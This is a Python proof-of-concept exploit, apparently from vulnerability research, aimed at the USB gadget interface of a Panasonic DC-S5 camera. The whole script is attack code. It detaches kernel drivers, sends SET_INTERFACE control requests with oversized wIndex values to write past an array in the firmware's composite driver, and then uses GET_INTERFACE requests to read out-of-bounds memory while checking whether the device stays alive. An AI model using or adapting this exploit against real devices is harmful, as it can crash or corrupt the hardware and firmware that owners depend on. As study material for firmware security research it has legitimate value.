#!/usr/bin/env python3
"""
S5 USB OOB Attack - using usb1 high-level API
Target: Panasonic DC-S5 (VID=0x04DA, PID=0x2382)
"""
import sys
import time
import usb1

VID = 0x04DA
PID = 0x2382

def main():
    print("=" * 60)
    print("S5 USB OOB Attack - Phase 1: Enumeration")
    print("=" * 60)
    
    ctx = usb1.LibUSBContext()
    
    # Find and open device
    try:
        handle = ctx.openByVendorIDAndProductID(VID, PID)
    except usb1.USBErrorNoDevice:
        print("ERROR: DC-S5 not found via USB (VID 0x04DA, PID 0x2382)")
        sys.exit(1)
    
    dev = handle.getDevice()
    print(f"Connected: {dev.getManufacturer()} {dev.getProduct()}")
    print(f"  VID=0x{dev.getVendorID():04X} PID=0x{dev.getProductID():04X}")
    print(f"  Speed: {dev.getDeviceSpeed()}")
    print(f"  Bus: {dev.getBusNumber()} Addr: {dev.getDeviceAddress()}")
    
    # Enumerate configurations
    print("\n--- USB Topology ---")
    for cfg in dev.iterConfigurations():
        print(f"  Config {cfg.bConfigurationValue}: {cfg.bNumInterfaces} interfaces")
        for intf in cfg.iterInterfaces():
            print(f"    Interface {intf.bInterfaceNumber}: "
                  f"class=0x{intf.bInterfaceClass:02X} "
                  f"sub=0x{intf.bInterfaceSubClass:02X} "
                  f"proto=0x{intf.bInterfaceProtocol:02X}")
            for setting in intf.iterSettings():
                print(f"      Alt {setting.bAlternateSetting}: "
                      f"class=0x{setting.bInterfaceClass:02X} eps={setting.bNumEndpoints}")
                for ep in setting.iterEndpoints():
                    print(f"        EP 0x{ep.bEndpointAddress:02X}: "
                          f"type=0x{ep.bmAttributes:02X} "
                          f"maxpkt={ep.wMaxPacketSize} intv={ep.bInterval}")
    
    # Get active configuration
    active_cfg = handle.getConfiguration()
    active_val = active_cfg.bConfigurationValue if active_cfg else None
    print(f"\n  Active config: {active_val}")
    
    # Enumerate all interface numbers
    all_ifaces = set()
    for cfg in dev.iterConfigurations():
        for intf in cfg.iterInterfaces():
            all_ifaces.add(intf.bInterfaceNumber)
    all_ifaces = sorted(all_ifaces)
    print(f"  Interface numbers found: {all_ifaces}")
    
    # Phase 2: Claim interfaces and probe
    print("\n" + "=" * 60)
    print("Phase 2: OOB Probes")
    print("=" * 60)
    
    claimed = []
    for iface in all_ifaces:
        try:
            if handle.kernelDriverActive(iface):
                print(f"  [i{iface}] Detaching kernel driver...")
                try:
                    handle.detachKernelDriver(iface)
                except Exception as e:
                    print(f"    Detach failed: {e}")
            handle.claimInterface(iface)
            claimed.append(iface)
            print(f"  [i{iface}] Claimed")
        except Exception as e:
            print(f"  [i{iface}] Claim failed: {e}")
    
    if not claimed:
        print("ERROR: Could not claim any interface")
        handle.close()
        sys.exit(1)
    
    # OOB Write probes - SET_INTERFACE with OOB wIndex
    print("\n--- OOB WRITE probes (SET_INTERFACE) ---")
    print("  wIndex > 15 means writing past current_alt_setting[16]")
    print("  Bug: composite.c checks low byte only (truncation)")
    print("  0x0100 -> offset 1KB past array")
    
    results = []
    
    # Try on the first claimed interface first
    test_iface = claimed[0]
    
    # Conservative offsets
    offsets = [0x0100, 0x0200, 0x0300, 0x0400]
    
    for off in offsets:
        try:
            # SET_INTERFACE: bmRequestType=0x01 (std, iface), bRequest=0x0B
            # wValue = alt setting, wIndex = interface number
            # THE BUG: wIndex is supposed to be the interface number (0-15)
            # But composite.c passes it to set_alt() where it indexes the array
            # We abuse this by sending wIndex=0x0100+ to go OOB
            handle.controlWrite(
                requestType=0x01,  # 0x00 | std
                request=0x0B,   # SET_INTERFACE
                value=0x4141,   # wValue (alt setting - canary)
                index=off,      # wIndex (OOB!)
                data=b'',
                timeout=2000
            )
            ret_str = "OK"
            ret_code = 0
        except usb1.USBError as e:
            ret_str = f"ERR({e.getErrorCode()})"
            ret_code = e.getErrorCode()
        except Exception as e:
            ret_str = f"EXC({type(e).__name__})"
            ret_code = -1
        
        time.sleep(0.3)
        
        # Check device alive
        try:
            _ = ctx.openByVendorIDAndProductID(VID, PID)
            alive = True
            _.close()
        except:
            alive = False
        
        results.append((test_iface, off, "WRITE", ret_str, alive))
        print(f"  SET_IFACE iface={test_iface} wIndex=0x{off:04X} -> {ret_str} | alive={alive}")
        
        if not alive:
            print("\n*** DEVICE DISCONNECTED after OOB write ***")
            print("    Waiting 60s for recovery...")
            for w in range(60):
                time.sleep(1)
                try:
                    d = ctx.openByVendorIDAndProductID(VID, PID)
                    print(f"    Reconnected after {w+1}s")
                    d.close()
                    break
                except:
                    pass
            else:
                print("    NOT recovered in 60s")
            break
    
    # OOB Read probes - GET_INTERFACE with OOB wIndex
    if results and results[-1][4]:  # still alive
        print("\n--- OOB READ probes (GET_INTERFACE) ---")
        print("  Each reads 1 byte from OOB location")
        
        read_offsets = [0x0100, 0x0200, 0x0300, 0x0400, 0x0500, 0x0600, 0x0800, 0x1000]
        
        for off in read_offsets:
            try:
                data = handle.controlRead(
                    requestType=0x01,   # 0x80
                    request=0x0A,    # GET_INTERFACE
                    value=0,
                    index=off,       # OOB wIndex
                    length=1,
                    timeout=2000
                )
                val = data[0] if data else -1
                ret_str = f"OK val=0x{val:02X}"
                alive = True
            except usb1.USBError as e:
                ret_str = f"ERR({e.getErrorCode()})"
                val = -1
                alive = True  # Error doesn't mean device died
            except Exception as e:
                ret_str = f"EXC({type(e).__name__})"
                val = -1
                alive = False
            
            time.sleep(0.2)
            results.append((test_iface, off, "READ", ret_str, alive))
            print(f"  GET_IFACE iface={test_iface} wIndex=0x{off:04X} -> {ret_str} | alive={alive}")
            
            if not alive:
                print("\n*** DEVICE DISCONNECTED ***")
                break
    
    # Cleanup
    print("\n--- Cleanup ---")
    for i in claimed:
        try:
            handle.releaseInterface(i)
        except:
            pass
    handle.close()
    
    # Summary
    print("\n" + "=" * 60)
    print("RESULTS SUMMARY")
    print("=" * 60)
    for (iface, off, op, ret, alive) in results:
        print(f"  {op:5s} iface={iface} 0x{off:04X} -> {ret:20s} alive={alive}")
    
    print("\nDone.")

if __name__ == "__main__":
    main()
